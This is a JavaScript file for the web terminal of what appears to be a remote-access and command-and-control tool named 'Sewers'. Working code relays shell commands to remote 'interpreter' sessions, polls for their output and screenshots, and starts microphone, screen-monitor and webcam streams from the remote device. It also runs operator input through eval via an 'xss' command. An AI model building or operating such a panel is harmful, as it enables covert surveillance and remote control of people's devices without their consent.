
/* Set functions for terminal.html */

	// Auto fetch
	let autoFetcher = async () => {}

	// Sleep
	const sleep = async seconds => {
		return new Promise(async resolve=>{
			setTimeout(resolve, seconds * 1000)
		})
	}

	// Escape HTML
	const escapeHTML = async data => {
		return new String(data)
		.replace(/\&/g, "&amp;")
		.replace(/\</g,"&lt;")
		.replace(/\>/g,"&gt;")
		.replace(/\"/g, "&quot;")
		.replace(/\'/g,"&#39;")
		.replace(/\\/g, "&#92;")
		.replace(/\//g, "&#x2F;")
		.replace(/ /g, "&nbsp;")
		.replace(/\t/g, "&emsp;")
		.replace(/\n/g, "<br>")
	}

	// Strip strings
	const strip = async data => {
		return data.replace(/^\s*/, "").replace(/\s*$/, "")
	}

	// Generate random string
	const randomString = async (min, max) => {
		const length = ( min + ( Math.random() * (max - min) ) )
		const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

		let buffer = ""

		while (buffer.length < length) {
			let index = parseInt( Math.random() * chars.length )
			buffer = buffer + chars.charAt(index)
		}

		return buffer
	}

	// Randomize seconds
	const randTime = async (min, max) => {
		return ( min + ( Math.random() * (max - min) ) )
	}

	// Print to terminal
	const print = async html => {
		const timestamped = document.createElement("stamp")

		timestamped.setAttribute( "time", new Date() )
		timestamped.innerHTML = html

		terminal.append(timestamped)

		await shrinkInputField()

		await resetClearBreaks()

		if (scrollOnOutput) {
			scrollToBottom()
		}
	}

	// Return readable timestamp
	const timestamp = async () => {
		const now = new Date()

		let D = now.getDate()
		D < 10 ? D = "0" + D : ""

		let M = now.getMonth() + 1
		M < 10 ? M = "0" + M : ""

		let Y = now.getFullYear()
		Y < 10 ? Y = "0" + Y : ""

		let h = now.getHours()
		h < 10 ? h = "0" + h : ""

		let m = now.getMinutes()
		m < 10 ? m = "0" + m : ""

		let s = now.getSeconds()
		s < 10 ? s = "0" + s : ""

		return D + "-" + M + "-" + Y + " " + h + ":" + m + ":" + s
	}

	const printHelp = async () => {
		const res = await sendRequest("GET", "/help.html", "")

		if (res.status == 200) {
			print(res.responseText)
		}
	}

	const printSessionInfo = async () => {
		let icon = "",
		    os_name

		if ( session_config.os.indexOf("Android" || "android") >= 0 ) {
			icon = "<img width=\"12px\" src=\"../../assets/images/os_android.svg\" />"
			os_name = "Android"
		} else if ( session_config.os.indexOf("iOS" || "ios") >= 0 ) {
			icon = "<img width=\"12px\" src=\"../../assets/images/os_apple.svg\" />"
			os_name = "iOS"
		} else if ( session_config.os.indexOf("cygwin" || "cygwin" || "mswin" || "mingw" || "bccwin" || "wince" || "emx") >= 0 ) {
			icon = "<img width=\"12px\" src=\"../../assets/images/os_windows.svg\" />"
			os_name = "Windows"
		} else if ( session_config.os.indexOf("Darwin" || "darwin") >= 0 ) {
			icon = "<img width=\"12px\" src=\"../../assets/images/os_apple.svg\" />"
			os_name = "macOS"
		} else if ( session_config.os.indexOf("Linux" || "linux") >= 0 ) {
			icon = "<img width=\"12px\" src=\"../../assets/images/os_linux.svg\" />"
			os_name = "Linux"
		}

		print(" " + icon + " <span class=\"bold\">" + os_name + " Interpreter<br></span>" + 
			"<span class=\"cyan\">Device&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"grey\">:</span> <span class=\"bold\">" + session_config.device + "<br></span>" + 
			"<span class=\"cyan\">Hostname&nbsp;&nbsp;&nbsp;</span><span class=\"grey\">:</span> <span class=\"bold\">" + session_config.hostname + "<br></span>" + 
			"<span class=\"cyan\">OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"grey\">:</span> <span class=\"bold\" style=\"overflow:hidden\">" + session_config.os + "<br></span>" + 
			"<span class=\"cyan\">Session&nbsp;ID&nbsp;</span><span class=\"grey\">:</span> <span class=\"bold\">" + session_config.session_id + "<br></span>" + 
			"<span class=\"cyan\">User-Agent&nbsp;</span><span class=\"grey\">:</span> <span class=\"bold\">" + session_config.user_agent + "<br><br></span>" + 
			"<span>Interpreter is fetching packets every <span class=\"bold\">" + session_config.fetch_rate.replace("-", "</span> to <span class=\"bold\">") + "</span> seconds</span>.<br></span>" + 
			"<hr>" + 
			" <img src=\"/assets/images/os_linux.svg\" width=\"12px\"><span class=\"bold\"> " + navigator.os + " Sewers v1.0<br></span>" + 
			"<span class=\"orange\">Relay Address&nbsp;</span><span class=\"grey\">:</span> <span class=\"bold\">" + relay_config.relay_address + "<br></span>" + 
			"<span class=\"orange\">Relay ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"grey\">:</span> <span class=\"bold\">" + relay + "<br></span>" + 
			"<span class=\"orange\">User-Agent&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"grey\">:</span> <span class=\"bold\">" + relay_config.user_agent + "<br><br></span>" + 
			"<span>Type <span class=\"orange bold\">?</span>, <span class=\"orange bold\">h</span> or <span class=\"orange bold\">help</span> for more info.<br></span>"
		)
	}

	// Return StdIn to sewers
	const stdIn = async data => {
		const form = new String(
			"body=" + data + 
			"&session_id=" + session_id + 
			"&relay_id=" + relay
		)

		sendForm("POST", "/post", form)
	}

	// Change fetch rate
	const changeFetchRate = async (min, max) => {
		const form = new String(
			"body=" + session_config.fetch_rate_tag + " " + min + " " + max + 
			"&session_id=" + session_id + 
			"&relay_id=" + relay
		)

		sendForm("POST", "/post", form)
		.then(async res=>{
			if (res.status == 200) {
				print("<span>Interpreter will be fetching packets every <span class=\"bold\">" + min + "</span> to <span class=\"bold\">" + max + "</span> seconds as soon as it fetches packets.<br></span>")

				session_config.fetch_rate = min + "-" + max
			}
		})
	}

	// Fetch new packets from interpreter
	const fetchPackets = async () => {
		const form = new String(
			"packet_id=" + 
			"&session_id=" + session_id + 
			"&relay_id=" + relay
		)

		let res = await sendForm("POST", "/get", form)

		if (res.status == 200) {
			let response = res.responseText

			if (response.length > 0) {
				let packets = response.split(",")

				for (i = 0; i < packets.length; i++) {
					let packetID = packets[i]

					const form = new String(
						"packet_id=" + packetID + 
						"&session_id=" + session_id + 
						"&relay_id=" + relay
					)

					res = await sendForm("POST", "/get", form)

					response = res.responseText

					if (response.length > 0) {
						new Audio("../../assets/audio/bell.mp3").play()

						const plaintext = atob(response)

						await print(response_tag + " <span class=\"bold lightgreen\">OK</span> <span>" + await timestamp() + "</span><br>")

						if ( plaintext.startsWith("\xff\xd8\xff") || plaintext.startsWith("\xFF\xD8\xFF") ) {
							const type = "image/jpg"

							print("<img title=\"Packet " + packetID + "\" src=\"data:" + type + ";base64," + await escapeHTML(response) + "\" /><br>")
							sleep(0.1).then(async()=>{ print("<hr>") })
						} else if ( plaintext.startsWith("\x89PNG\r\n\x1a\n") || plaintext.startsWith("\x89PNG\r\n\x1A\n") ) {
							const type = "image/png"

							print("<img title=\"Packet " + packetID + "\" src=\"data:" + type + ";base64," + await escapeHTML(response) + "\" /><br>")
							sleep(0.1).then(async()=>{ print("<hr>") })
						} else if ( plaintext.startsWith("GIF87a") || plaintext.startsWith("GIF89a") ) {
							const type = "image/gif"

							print("<img title=\"Packet " + packetID + "\" src=\"data:" + type + ";base64," + await escapeHTML(response) + "\" /><br>")
							sleep(0.1).then(async()=>{ print("<hr>") })
						} else if ( plaintext.startsWith("<?xml") && plaintext.indexOf("<svg") >= 0 || plaintext.startsWith("<svg") ) {
							const type = "image/svg+xml"

							print("<img title=\"Packet " + packetID + "\" src=\"data:" + type + ";base64," + await escapeHTML(response) + "\" /><br>")
							sleep(0.1).then(async()=>{ print("<hr>") })
						} else {
							let stdout = await escapeHTML(plaintext)
							stdout = stdout + (stdout.endsWith("<br>") ? "" : "\n")

							print(stdout)
						}
					}
				}
			}
		}
	}

	// Start auto fetcher
	const startAutoFetching = async (min, max) => {
		if (auto_fetching) {
			auto_fetching = false

			load_line.classList.add("stop")

			startAutoFetching(min, max)
		} else {
			auto_fetching = true

			fetch_delay = randTime(min, max) * 1000

			fetchPackets()

			autoFetcher = async () => {
				if (auto_fetching) {
					fetch_delay = await randTime(min, max) * 1000

					startLoadLine()

					setTimeout(autoFetcher, fetch_delay)

					fetchPackets()
				}
			}

			autoFetcher()

			print("<span>Fetching new packets from relay every <span class=\"bold\">" + min + "</span> to <span class=\"bold\">" + max + "</span> seconds.<br></span>")
		}
	}

	// Stop auto fetcher
	const stopAutoFetching = async (min, max) => {
		if (auto_fetching) {
			auto_fetching = false
			fetch_delay = 1000

			autoFetcher = async () => {}

			load_line.classList.add("stop")

			print("<span>Auto fetcher stopped.<br></span>")
		} else {
			print("<span>Auto fetcher is not running.</span>")
		}
	}

	// Get session config
	const getSessionConfig = async (relay, session) => {
		let res = await sendRequest("GET", "/session/" + relay + "/" + session, "")

		if (res.status == 200) {
			let response = JSON.parse(res.responseText)

			session_config = response
		}
	}

	// Get relay config
	const getRelayConfig = async relay => {
		let res = await sendRequest("GET", "/config/" + relay, "")

		if (res.status == 200) {
			let response = JSON.parse(res.responseText)

			relay_config = response
		}
	}

	// Move loadline
	const startLoadLine = async () => {
		load_line.classList.add("stop")

		setTimeout(async()=>{
			const delay = fetch_delay - 600

			load_line.style.transition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
			load_line.style.webkitTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
			load_line.style.mozTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
			load_line.style.msTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
			load_line.style.oTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms"

			load_line.classList.remove("stop")
		}, 100)
	}

	// Scroll to bottom
	const scrollToBottom = async () => {
		scrollBox.scrollTop = terminal.getBoundingClientRect().height
	}

	// Set clear breaks for clear function
	const resetClearBreaks = async () => {
		clearBreaks = parseInt( ( self.innerHeight - 84 ) / 12 )
	}

	// Shrink input field as scrollbox increases in size
	const shrinkInputField = async () => {
		form.style.height = "calc(100vh - " + scrollBox.getBoundingClientRect().height + "px)"
	}

	// Clear function
	const clear = async () => {
		let linebreaks = "<br>".repeat(clearBreaks)

		print(linebreaks)
	}

	const parseUserAgent = async () => {
		if ( navigator.userAgent.match(/android/i) ) {
			navigator.os = "Android"
		} else if ( navigator.userAgent.match(/ios/i) ) {
			navigator.os = "iOS"
		} else if ( navigator.userAgent.match(/windows/i) ) {
			navigator.os = "Windows"
		} else if ( navigator.userAgent.match(/mac os/i) ) {
			navigator.os = "macOS"
		} else if ( navigator.userAgent.match(/linux/i) ) {
			navigator.os = "Linux"
		}
	}

	// Append new stream to menu
	const addStream = async (streamID, streamType) => {
		if (streamType == "STREAMMIC") {
			document.querySelector("html body div.menu").append("<div class=\"item left\" title=\"Stream ID: " + streamID + "\" onclick=\"window.open('" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?mic&" + streamID + "&" + streamFile + ".mp4', '" + streamFile + ".wav', 'width=180,height=230,status=no,menubar=no,toolbar=no,titlebar=no,location=no')\"><div class=\"icon streammic\"><div class=\"icon rec blinking\"></div></div></div>")
		} else if (streamType == "STREAMMON") {
			document.querySelector("html body div.menu").append("<div class=\"item left\" title=\"Stream ID: " + streamID + "\" onclick=\"window.open('" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?mon&" + streamID + "&" + streamFile + ".mp4', '" + streamFile + ".mp4', 'width=640,height=360,status=no,menubar=no,toolbar=no,titlebar=no,location=no')\"><div class=\"icon streammon\"><div class=\"icon rec blinking\"></div></div></div>")
		} else if (streamType == "STREAMCAM") {
			document.querySelector("html body div.menu").append("<div class=\"item left\" title=\"Stream ID: " + streamID + "\" onclick=\"window.open('" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?cam&" + streamID + "&" + streamFile + ".mp4', '" + streamFile + ".mp4', 'width=640,height=360,status=no,menubar=no,toolbar=no,titlebar=no,location=no')\"><div class=\"icon eye\"><div class=\"icon rec blinking\"></div></div></div>")
		}
	}

	// Start new monitor stream
	const streamMon = async (bitrate, resolution) => {
		let res = await sendRequest("POST", "/", "data=STREAMMON " + bitrate + " " + resolution + "&session_id=" + session_id)

		if (res.status == 200) {
			let response = res.responseText.split(" ")

			let streamID = response[0]
			let streamFile = response[1]

			print(response_tag + " [<span class='green'>OK</span>] " + "<span>" + await timestamp() + "</span>")

			if (response[0] == "Usage:") {
				print("<span>" + response + "</span>")
			} else {
				print("<span>Monitor stream started.</span>")
				print("<span>&nbsp;&nbsp;├&nbsp;Stream ID&nbsp;&nbsp;: </span><span>" + streamID + "</span>")
				print("<span>&nbsp;&nbsp;└&nbsp;Stream URL&nbsp;: </span><span><a onclick='window.open(\"" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?mon&" + streamID + "&" + streamFile + ".mp4\", \"" + streamFile + ".mp4\", \"width=640,height=360,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'>" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?mon&" + streamID + "&" + streamFile + ".mp4</a></span>")

				addStream(streamID, "STREAMMON")
			}
		}
	}

	// Start new microphone stream
	const streamMic = async bitrate => {
		let res = await sendRequest("POST", "/", "data=STREAMMIC " + bitrate + "&session_id=" + session_id)

		if (res.status == 200) {
			let response = res.responseText.split(" ")

			let streamID = response[0]
			let streamFile = response[1]

			print(response_tag + " [<span class='green'>OK</span>] " + "<span>" + await timestamp() + "</span>")

			if (response[0] == "Usage:") {
				print("<span>" + response + "</span>")
			} else {
				print("<span>Microphone stream started.</span>")
				print("<span>&nbsp;&nbsp;├&nbsp;Stream ID&nbsp;&nbsp;: </span><span>" + streamID + "</span>")
				print("<span>&nbsp;&nbsp;└&nbsp;Stream URL&nbsp;: </span><span><a onclick='window.open(\"" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?mic&" + streamID + "&" + streamFile + ".wav\", \"" + streamFile + ".wav\", \"width=180,height=230,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'>" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?mic&" + streamID + "&" + streamFile + ".wav</a></span>")

				addStream(streamID, "STREAMMIC")
			}
		}
	}

	// Start new webcam stream
	const streamCam = async (bitrate, resolution) => {
		print(request_tag + "<span title='" + await timestamp() + "'>Streaming webcam...</span>")

		let res = await sendRequest("POST", "/", "data=STREAMCAM&session_id=" + session_id)

		if (res.status == 200) {
			let response = res.responseText.split(" ")

			let streamID = response[0]
			let streamFile = response[1]

			print(response_tag + " [<span class='green'>OK</span>] " + "<span>" + await timestamp() + "</span>")

			if (response[0] == "Usage:") {
				print("<span>" + response + "</span>")
			} else {
				print("<span>Webcam stream started.</span>")
				print("<span>&nbsp;&nbsp;├&nbsp;Stream ID&nbsp;&nbsp;: </span><span>" + streamID + "</span>")
				print("<span>&nbsp;&nbsp;└&nbsp;Stream URL&nbsp;: </span><span><a onclick='window.open(\"" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?cam&" + streamID + "&" + streamFile + ".mp4\", \"" + streamFile + ".mp4\", \"width=180,height=230,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'>" + location.protocol + "//" + location.hostname + (location.port ? ":" + location.port : "") + "/stream?cam&" + streamID + "&" + streamFile + ".mp4</a></span>")

				addStream(streamID, "STREAMCAM")
			}
		}
	}

	// Network activity indicator
	const showNetworkIndicator = async () => {
		const network_indicator = document.querySelector("html body div.menu div.item div.network-indicator")

		network_indicator.classList.remove("hidden")
	}

	// Network activity indicator
	const hideNetworkIndicator = async () => {
		const network_indicator = document.querySelector("html body div.menu div.item div.network-indicator")

		network_indicator.classList.add("hidden")
	}

	// Input handler
	const onCommand = async () => {
		const cmd = textarea.value

		textarea.value = ""

		parseCommand(cmd)
	}

	// StdIn handler
	const parseCommand = async cmd => {
		cmd_history_i = 0

		print( request_tag + "<span title='" + await timestamp() + "'>" + await escapeHTML(cmd) + "</span><br>" )

		if ( !cmd.match(/^\s*$/) ) {
			if (cmd_history[0] != cmd) {
				cmd_history.unshift(cmd)
			}

			// Parse command
			if ( cmd.match(/^\s*\#/) ) {
				return
			} else if ( cmd.match(/^\s*startautofetching /) ) {
				cmd = await strip(cmd)

				if (cmd.split(" ")[3]) {
					print( "Too many arguments.<br>Usage: <span class=\"tan\">startautofetching</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>" )
				} else if (!cmd.split(" ")[2]) {
					print( "Not enough arguments.<br>Usage: <span class=\"tan\">startautofetching</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>" )
				} else if ( parseInt(cmd.split(" ")[1]) >= parseInt(cmd.split(" ")[2]) ) {
					print( "Minimum value must be less than maximum.<br>Usage: <span class=\"tan\">startautofetching</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>" )
				} else if ( parseInt(cmd.split(" ")[1]) < 1 ) {
					print( "Minimum value must be at least 1.<br>Usage: <span class=\"tan\">startautofetching</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>" )
				} else {
					const min = parseInt( cmd.split(" ")[1] ),
					      max = parseInt( cmd.split(" ")[2] )

					startAutoFetching(min, max)
				}
			} else if ( cmd.match(/^\s*clear\s*$/) ) {
				clear()
			} else if ( cmd.match(/^\s*exit\s*$/) ) {
				self.close() || alert("You can only use this in pop-up mode.")
			} else if ( 
				cmd.match(/^\s*[?]\s*$/) 
				|| cmd.match(/^\s*h\s*$/) 
				|| cmd.match(/^\s*help\s*$/) 
				|| cmd.match(/^\s*commands\s*$/) 
				|| cmd.match(/^\s*usage\s*$/) 
			) {
				printHelp()
			} else if ( cmd.match(/^\s*checkstreams\s*$/) ) {
				checkStreams()
			} else if ( cmd.match(/^\s*reset\s*$/) ) {
				if (warnOnReset) {
					self.location = location.href
				}	else {
					document.body.innerHTML = ""
					window.onbeforeunload = ""
					self.location = location.href
				}
			} else if ( cmd.match(/^\s*stopautofetching\s*$/) ) {
				stopAutoFetching()
			} else if ( cmd.match(/^\s*streammon /) ) {
				const args = cmd.split(" ")

				streamMon( args[1], args[2] )
			} else if ( cmd.match(/^\s*streammic /) ) {
				streamMic( cmd.split(" ")[1] )
			} else if ( cmd.match(/^\s*info\s*$/) ) {
				printSessionInfo()
			} else if ( cmd.match(/^\s*fetch\s*$/) ) {
				fetchPackets()
			} else if ( cmd.match(/^\s*fetchrate /) ) {
				cmd = await strip(cmd)

				const args = cmd.split(" ")

				if (args[3]) {
					print( "Too many arguments.<br>Usage: <span class=\"tan\">fetchrate</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>" )
				} else if (!args[2]) {
					print( "Not enough arguments.<br>Usage: <span class=\"tan\">fetchrate</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>" )
				} else if ( parseInt(args[1]) >= parseInt(args[2]) ) {
					print( "Minimum value must be less than maximum.<br>Usage: <span class=\"tan\">fetchrate</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>" )
				} else if ( parseInt(args[1]) < 1 ) {
					print( "Minimum value must be at least 1.<br>Usage: <span class=\"tan\">fetchrate</span> <span class=\"grey\">" + await escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>" )
				} else {
					const min = parseInt( args[1] ),
					      max = parseInt( args[2] )

					changeFetchRate(min, max)
				}
			} else if ( cmd.match(/^\s*shell /) || cmd.match(/^\s*sh /) ) {
				const shell_command = await strip( encodeURIComponent( cmd.replace(/^\s*(?:shell|sh)\s*/, "") ) )

				stdIn(shell_command)
			} else if ( cmd.match(/^xss /) ) {
				const xss_command = cmd.replace(/^xss /, "")

				parseXSSCommand(xss_command)
			} else {
				print( await escapeHTML(cmd) + ": command not found. Type <span class=\"bold orange\">help</span> to see a list of commands.<br>" )
			}
		}

		textarea.focus()
	}

	// XSS input handler
	const onXSSCommand = async () => {
		const command = jsfield.value

		jsfield.value = ""

		parseXSSCommand(command)

		textarea.focus()
	}

	// XSS input handler
	const parseXSSCommand = async cmd => {
		const esc_cmd = await escapeHTML(cmd)

		print(request_tag + " <span class=\"bold red\">XSS</span> <span>" + await timestamp() + "</span><br>")
		print("<span class=\"red\">" + esc_cmd + "</span><br>")
		print( eval(cmd) + "<br>" )
	}
